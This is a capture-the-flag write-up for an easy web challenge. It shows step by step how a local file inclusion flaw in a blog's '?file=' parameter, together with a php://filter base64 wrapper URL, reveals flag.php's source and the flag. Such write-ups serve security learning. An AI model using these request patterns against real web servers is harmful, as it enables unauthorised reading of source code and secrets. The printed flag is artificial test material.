I made a blog! -- Easy

Description -- Did you check out my blog posts?

Browsing the blog, we can see that each article is passed as an arg to the "?file=" parameter.

After this, I decided to try to use LFI to retrieve files stored on the web server.

I display the contents of the robots.txt file by using the ?file= parameter --

http://ez.ctf.cafe:9999/blog-posts.php?file=robots.txt

User-agent: *
Disallow: /flag.php

With the robots.txt file, I can now see that there is a flag.php file.

When attempting to display the content of the file, there is only this sentence -- How do you filter your coffee?

This leads me to think filters, or in this case, PHP Wrappers.

So I then decided to use PHP Wrappers to get the content of the flag.php file in base64 and then decode that value --

http://ez.ctf.cafe:9999/blog-posts.php?file=php://filter/convert.base64-encode/resource=flag.php

I get the value -- PD9waHAKCWVjaG8gJ0hvdyBkbyB5b3UgZmlsdGVyIHlvdXIgY29mZmVlPyc7ICAgIAoJLy8gRVotQ1RGe0xGSV8xU18zWn0KPz4K

After decoding the string with https://www.base64decode.org/ --

<?php
    echo 'How do you filter your coffee?';    
    // EZ-CTF{LFI_1S_3Z}
?>

Andddddd there is the Flag
